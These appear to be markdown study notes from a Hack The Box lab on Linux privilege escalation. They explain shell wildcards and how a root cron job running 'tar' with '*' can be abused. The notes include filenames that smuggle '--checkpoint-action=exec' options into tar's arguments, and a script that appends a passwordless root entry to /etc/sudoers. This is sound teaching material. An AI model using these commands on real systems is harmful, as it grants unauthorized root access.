# Wildcard Abuse

| **Command** | **Description** |
|--------------|-------------------|
| * | An asterisk that can match any number of characters in a filename|
| ? | Matches a single character | 
| [ ] | Brackets enclose characters and can match any single one at the defined position | 
| ~ | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. | 
| - | A hyphen within brackets will denote a range of characters |

An example of how wildcards can be abused for privilege escalation is the **tar** command, a command program creating/extracting archives. If we look at the *man page* for the **tar** command:

```
<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
```

The **--checkpoint-action** option permits an **EXEC** action to be executed when a checkpoint is reached (i.e., run an arbirtrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, **--checkpoint=1** and **--checkpoint-action=exec=sh root.sh** is passed to **tar** as command-line options. Let's see this in practice.

Consider the following cron job, which is set to run every minute, so it is a good candidate for privilege escalation.

```
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the crob jobs run, these file names will be interpreted as arguments and execute any commands that we specify:

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

We can check and see that the necessary files were created

```
<...>
```

Once the cron job runs again, we can check for the newly added sudo privileged and sudo to root directly.


---

↩️: [Home](../../index.md)
